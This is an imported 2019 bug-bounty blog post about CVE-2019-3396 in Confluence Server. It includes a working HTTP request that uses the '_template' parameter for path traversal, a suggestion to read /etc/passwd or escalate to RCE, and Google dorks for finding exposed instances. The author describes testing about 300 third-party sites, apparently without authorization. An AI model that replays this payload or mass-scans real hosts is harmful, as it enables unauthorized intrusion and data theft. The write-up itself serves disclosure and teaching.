---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-10-29_how-i-hacked-50-companies-in-6-hrs.md
original_filename: 2019-10-29_how-i-hacked-50-companies-in-6-hrs.md
title: How I hacked 50+ Companies in 6 hrs
category: documents
detected_topics:
- command-injection
- path-traversal
- otp
- csrf
- api-security
tags:
- imported
- documents
- command-injection
- path-traversal
- otp
- csrf
- api-security
language: en
raw_sha256: f143fa4d5ae891f39b27deed1423afa91cc23e10fc7b30d09caf670276d1d5ad
text_sha256: 123df5b65839174c32ebd41845b47dd2d977bc8a798788fdfdcb95f7ea0a8fb7
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# How I hacked 50+ Companies in 6 hrs

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-10-29_how-i-hacked-50-companies-in-6-hrs.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, otp, csrf, api-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `f143fa4d5ae891f39b27deed1423afa91cc23e10fc7b30d09caf670276d1d5ad`
- Text SHA256: `123df5b65839174c32ebd41845b47dd2d977bc8a798788fdfdcb95f7ea0a8fb7`


## Content

---
title: "How I hacked 50+ Companies in 6 hrs"
url: "https://medium.com/vault-infosec/how-i-hacked-50-companies-in-6-hrs-7ec0368a9196"
authors: ["Vignesh C (@pwn_r00t)"]
bugs: ["SSTI", "RCE"]
publication_date: "2019-10-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4969
scraped_via: "browseros"
---

# How I hacked 50+ Companies in 6 hrs

How I hacked 50+ Companies in 6 hrs
Vignesh C
Follow
4 min read
·
Oct 29, 2019

350

1

Long story short, I have created my Hackerone/Bugcrowd profiles a way back in 2016 but I have never reported a bug there. I have never thought of doing a bug hunting but this vulnerability has made me do it.

What was the issue?

SSTI and RCE in Confluence Server via Widget Connector [CVE-2019–3396] — An attacker will be able to exploit this issue to achieve path traversal and remote code execution on systems that run a vulnerable version of Confluence Server or Data Center. Confluence Security Advisory Released — 2019–04–17

How does the Widget Connector go vulnerable?

Widget Connector macro will help you to embed online videos, slideshows, photostreams and more directly into your page when you provide an URL.

This macro was designed to support content from these sites:

YouTube, Vimeo, MySpace Video, Flickr, Twitter, Slide Rocket, Google Calendar, etc.

Example Vulnerable Code:

Get Vignesh C’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The Widget Connector has defined some renders, for example, FriendFeedRenderer:

public class FriendFeedRenderer implements WidgetRenderer
{
...
public String getEmbeddedHtml(String url, Map<String, String> params) {
params.put("_template", "com/atlassian/confluence/extra/widgetconnector/templates/simplejscript.vm");
return this.velocityRenderService.render(getEmbedUrl(url), params);
}
}

So in this case, an attacker can provide _template values which the backend will use the params to render

Press enter or click to view image in full size
Steps To Reproduce:

I swear this would be the simplest PoC you can ever dream of.

Capture the vulnerable confluence page request in burp (let it be a GET or POST) and send it to Repeater.

2. Now modify your captured request as shown below and parse the request.

Note: You may need to change the path of your request and add “Referer:” header, as it is mandatorily expected in most of the cases when I tested, If you did not include that it may throw you an error “XSRF check failed”

POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: confluence.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en-GB;q=0.8,ach;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://confluence.victim.com/
Content-Type: application/json;charset=UTF-8
X-Requested-With: XMLHttpRequest
Upgrade-Insecure-Requests: 1
Content-Length: 163
Connection: close
{"contentId":"65601","macro":{"name":"widget","params":{"url":"https://www.youtube.com/watch?v=2aK8hy50fS4","width":"1000","height":"1000","_template":"../web.xml"},"body":""}}

Instead of ../web.xml, you can tryfile:///etc/passwd (path traversal payloads) or Remote Code Execution to increase the severity of your finding.

Press enter or click to view image in full size
Press enter or click to view image in full size
Fix:

In fixed versions, it will call doSanitizeParameters before render html which will remove the _template in parameters.

Now What?
How to get other companies who are affected by this?

Yes, you are right! I got an idea, why don’t I Google Dork!

I tried this “intitle:dashboard-confluence” and was able to find ~100 confluence links out of which 21 was found vulnerable.
On seeing the above dork results, I realized that the confluence link may not necessarily be confluence.companyname.com.
So I tried, below dorks/keywords in Google, which gave me around 300+ confluence links out of which 50+ companies were found vulnerable to this.

inurl:http://confluence. login.action

inurl:https://wiki. .com/confluence/

allinurl: /confluence/login.action?

“/spacedirectory/view.action”

“/pages/viewpage.action?”

“/pages/releaseview.action?”

“aboutconfluencepage.action”

I haven’t targeted any of the bounty programs sites but yet, I received a lot of “Recognition” from various companies as bounty in dollars and Euros, other companies said that they will send me swags as a token of appreciation.

A day I could remember for a very long time, HAPPY HACKING !!!

Smash your claps if you do like this post.

Press enter or click to view image in full size

Follow me on twitter for more updates — @pwn_r00t

References:

【CVE-2019–3396】:SSTI and RCE in Confluence Server via Widget Connector
https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html According to the document …

chybeta.github.io

Confluence Security Advisory — 2019–04–17 — Atlassian Documentation
Give Access to Unlicensed Users from Jira Service Desk

confluence.atlassian.com
